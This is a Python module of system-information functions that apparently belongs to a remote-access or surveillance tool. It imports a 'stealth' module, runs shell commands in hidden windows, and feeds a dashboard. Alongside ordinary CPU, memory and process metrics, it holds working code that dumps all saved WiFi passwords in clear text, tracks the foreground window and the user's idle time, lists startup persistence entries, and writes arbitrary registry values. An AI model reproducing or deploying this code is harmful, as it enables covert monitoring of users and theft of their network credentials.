"""Hardware, operating system, process and network information."""

from __future__ import annotations

import ctypes
import os
import platform
import shutil
import socket
import subprocess
import sys
import time
from datetime import datetime, timedelta

from . import stealth

IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0


class _MemoryStatus(ctypes.Structure):
    _fields_ = [
        ("dwLength", ctypes.c_ulong),
        ("dwMemoryLoad", ctypes.c_ulong),
        ("ullTotalPhys", ctypes.c_ulonglong),
        ("ullAvailPhys", ctypes.c_ulonglong),
        ("ullTotalPageFile", ctypes.c_ulonglong),
        ("ullAvailPageFile", ctypes.c_ulonglong),
        ("ullTotalVirtual", ctypes.c_ulonglong),
        ("ullAvailVirtual", ctypes.c_ulonglong),
        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
    ]


class _LastInput(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]


class _PowerStatus(ctypes.Structure):
    _fields_ = [
        ("ACLineStatus", ctypes.c_byte),
        ("BatteryFlag", ctypes.c_byte),
        ("BatteryLifePercent", ctypes.c_byte),
        ("SystemStatusFlag", ctypes.c_byte),
        ("BatteryLifeTime", ctypes.c_ulong),
        ("BatteryFullLifeTime", ctypes.c_ulong),
    ]


class _FileTime(ctypes.Structure):
    _fields_ = [("low", ctypes.c_ulong), ("high", ctypes.c_ulong)]


_cpu_previous: tuple[int, int, int] = (0, 0, 0)


def _shell(command: str, timeout: int = 60) -> str:
    """Run a shell command and return its combined output."""
    try:
        completed = subprocess.run(
            command, shell=True, capture_output=True, timeout=timeout,
            stdin=subprocess.DEVNULL, creationflags=CREATE_NO_WINDOW,
        )
        output = (completed.stdout or b"") + (completed.stderr or b"")
        return output.decode(errors="replace").strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "(timed out)"
    except Exception as error:
        return f"(error: {error})"


# --------------------------------------------------------------------------
# Metrics
# --------------------------------------------------------------------------


def cpu_percent() -> float:
    """Approximate system CPU usage, 0-100."""
    global _cpu_previous
    if IS_WINDOWS:
        try:
            kernel32 = ctypes.windll.kernel32
            idle, kernel, user = _FileTime(), _FileTime(), _FileTime()
            kernel32.GetSystemTimes(ctypes.byref(idle), ctypes.byref(kernel), ctypes.byref(user))
            idle_now = (idle.high << 32) + idle.low
            kernel_now = (kernel.high << 32) + kernel.low
            user_now = (user.high << 32) + user.low
            idle_prev, kernel_prev, user_prev = _cpu_previous
            _cpu_previous = (idle_now, kernel_now, user_now)
            total = (kernel_now - kernel_prev) + (user_now - user_prev)
            return round(100.0 * (1 - (idle_now - idle_prev) / total), 1) if total > 0 else 0.0
        except Exception:
            return 0.0
    try:
        return round(os.getloadavg()[0] / (os.cpu_count() or 1) * 100, 1)
    except Exception:
        return 0.0


def memory_percent() -> float:
    """Percentage of physical memory in use."""
    if IS_WINDOWS:
        try:
            status = _MemoryStatus()
            status.dwLength = ctypes.sizeof(_MemoryStatus)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(status))
            return float(status.dwMemoryLoad)
        except Exception:
            return 0.0
    try:
        with open("/proc/meminfo", "r", encoding="ascii") as handle:
            entries = dict(line.split(":") for line in handle.read().splitlines())
        total = float(entries["MemTotal"].split()[0])
        available = float(entries["MemAvailable"].split()[0])
        return round((total - available) / total * 100, 1)
    except Exception:
        return 0.0


def battery() -> str:
    """Battery percentage with a ``+`` suffix when charging."""
    if IS_WINDOWS:
        try:
            status = _PowerStatus()
            if ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(status)):
                if status.BatteryLifePercent != 255:
                    return f"{status.BatteryLifePercent}%{' (charging)' if status.ACLineStatus else ''}"
        except Exception:
            pass
    return "n/a"


def idle_seconds() -> float:
    """Seconds since the last keyboard or mouse input."""
    if IS_WINDOWS:
        try:
            info = _LastInput()
            info.cbSize = ctypes.sizeof(_LastInput)
            if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(info)):
                elapsed = (ctypes.windll.kernel32.GetTickCount() - info.dwTime) & 0xFFFFFFFF
                return round(elapsed / 1000.0, 1)
        except Exception:
            pass
    return 0.0


def uptime() -> str:
    """Human readable system uptime."""
    try:
        if IS_WINDOWS:
            milliseconds = ctypes.windll.kernel32.GetTickCount64()
            boot = time.time() - milliseconds / 1000.0
        else:
            with open("/proc/uptime", "r", encoding="ascii") as handle:
                boot = time.time() - float(handle.read().split()[0])
        return str(timedelta(seconds=int(time.time() - boot)))
    except Exception:
        return "unknown"


def active_window() -> str:
    """Title of the foreground window."""
    if IS_WINDOWS:
        try:
            user32 = ctypes.windll.user32
            handle = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(handle)
            buffer = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(handle, buffer, length + 1)
            return buffer.value or "?"
        except Exception:
            return "?"
    if sys.platform == "darwin":
        return _shell(
            'osascript -e \'tell application "System Events" to get name of first '
            'process whose frontmost is true\'', timeout=5)
    return _shell("xdotool getactivewindow getwindowname", timeout=5)


def process_count() -> int:
    """Number of running processes."""
    if IS_WINDOWS:
        try:
            psapi = ctypes.WinDLL("psapi")
            array = (ctypes.c_ulong * 2048)()
            needed = ctypes.c_ulong()
            psapi.EnumProcesses(array, ctypes.sizeof(array), ctypes.byref(needed))
            return max(0, needed.value // 4 - 1)
        except Exception:
            return 0
    try:
        return len([name for name in os.listdir("/proc") if name.isdigit()])
    except OSError:
        return 0


# --------------------------------------------------------------------------
# Reports
# --------------------------------------------------------------------------


def summary() -> dict[str, object]:
    """Structured machine description used by the dashboard."""
    uname = platform.uname()
    try:
        total, _used, free = shutil.disk_usage(os.path.abspath(os.sep))
        disk = f"{free / 2**30:.0f} GB free of {total / 2**30:.0f} GB"
    except OSError:
        disk = "unknown"
    try:
        user = os.getlogin()
    except OSError:
        user = os.environ.get("USERNAME") or os.environ.get("USER") or "?"
    return {
        "user": user,
        "admin": stealth.is_admin(),
        "system": f"{uname.system} {uname.release} ({uname.machine})",
        "cpu": uname.processor or platform.processor() or "?",
        "cores": os.cpu_count(),
        "ram_percent": memory_percent(),
        "disk": disk,
        "uptime": uptime(),
        "python": sys.version.split()[0],
        "hostname": socket.gethostname(),
        "address": local_address(),
    }


def text_report() -> str:
    """Plain-text version of :func:`summary`."""
    data = summary()
    return "\n".join([
        f"user     : {data['user']}   admin: {data['admin']}",
        f"system   : {data['system']}",
        f"cpu      : {data['cpu']}  cores: {data['cores']}",
        f"ram      : {data['ram_percent']}%   disk: {data['disk']}",
        f"uptime   : {data['uptime']}   python: {data['python']}",
        f"host     : {data['hostname']}   address: {data['address']}",
    ])


def local_address() -> str:
    """Best guess at the machine's LAN address."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
            probe.connect(("8.8.8.8", 80))
            return probe.getsockname()[0]
    except OSError:
        return "127.0.0.1"


def processes() -> list[dict[str, str]]:
    """List running processes as ``{name, pid, memory}``."""
    output = _shell("tasklist /fo csv /nh" if IS_WINDOWS
                    else "ps -eo pid,comm,rss --no-headers")
    rows: list[dict[str, str]] = []
    for line in output.splitlines():
        try:
            if IS_WINDOWS:
                fields = [item.strip('"') for item in line.split('","')]
                if len(fields) >= 5:
                    rows.append({"name": fields[0], "pid": fields[1], "memory": fields[4]})
            else:
                fields = line.split(None, 2)
                if len(fields) >= 2:
                    memory = f"{int(fields[2]) / 1024:.0f} MB" if len(fields) > 2 else ""
                    rows.append({"name": fields[1], "pid": fields[0], "memory": memory})
        except (ValueError, IndexError):
            continue
    return rows[:600]


def wifi_passwords() -> str:
    """Saved WiFi profiles and their keys."""
    if not IS_WINDOWS:
        return _shell("nmcli -s -g NAME,PASSWORD connection show")
    profiles = _shell("netsh wlan show profiles")
    names = []
    for line in profiles.splitlines():
        if ":" in line and "All User Profile" in line:
            names.append(line.split(":", 1)[1].strip())
    lines = []
    for name in names:
        details = _shell(f'netsh wlan show profile name="{name}" key=clear')
        key = "(open)"
        for line in details.splitlines():
            if "Key Content" in line:
                key = line.split(":", 1)[1].strip()
                break
        lines.append(f"{name} : {key}")
    return "\n".join(lines) or "none"


def startup_entries() -> list[str]:
    """Programs that launch at login."""
    entries: list[str] = []
    if IS_WINDOWS:
        import winreg
        for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                            (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
            try:
                key = winreg.OpenKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run")
                count = winreg.QueryInfoKey(key)[1]
                for index in range(count):
                    name, value, _ = winreg.EnumValue(key, index)
                    entries.append(f"{label}  {name} = {value}")
            except OSError:
                pass
        folder = os.path.join(os.environ.get("APPDATA", ""),
                              r"Microsoft\Windows\Start Menu\Programs\Startup")
        if os.path.isdir(folder):
            entries += [f"Startup  {name}" for name in os.listdir(folder)]
    else:
        entries.append(_shell("ls -1 ~/.config/autostart 2>/dev/null; crontab -l 2>/dev/null"))
    return entries


def registry_read(path: str) -> str:
    """Read a registry value in ``HIVE\\Key\\Value`` form."""
    if not IS_WINDOWS:
        return "n/a"
    import winreg
    hive_name, _, remainder = path.partition("\\")
    value_name = remainder.rpartition("\\")[2]
    key_path = remainder.rpartition("\\")[0]
    hive = {"HKCU": winreg.HKEY_CURRENT_USER, "HKLM": winreg.HKEY_LOCAL_MACHINE,
            "HKCR": winreg.HKEY_CLASSES_ROOT}.get(hive_name.upper())
    if hive is None:
        return "unknown hive (use HKCU or HKLM)"
    try:
        with winreg.OpenKey(hive, key_path) as key:
            value, _ = winreg.QueryValueEx(key, value_name)
            return str(value)
    except OSError as error:
        return f"(error: {error})"


def registry_write(path: str, value: str) -> str:
    """Write a string registry value."""
    if not IS_WINDOWS:
        return "n/a"
    import winreg
    hive_name, _, remainder = path.partition("\\")
    value_name = remainder.rpartition("\\")[2]
    key_path = remainder.rpartition("\\")[0]
    hive = {"HKCU": winreg.HKEY_CURRENT_USER, "HKLM": winreg.HKEY_LOCAL_MACHINE}.get(hive_name.upper())
    if hive is None:
        return "unknown hive (use HKCU or HKLM)"
    try:
        with winreg.CreateKey(hive, key_path) as key:
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value)
        return "written"
    except OSError as error:
        return f"(error: {error})"
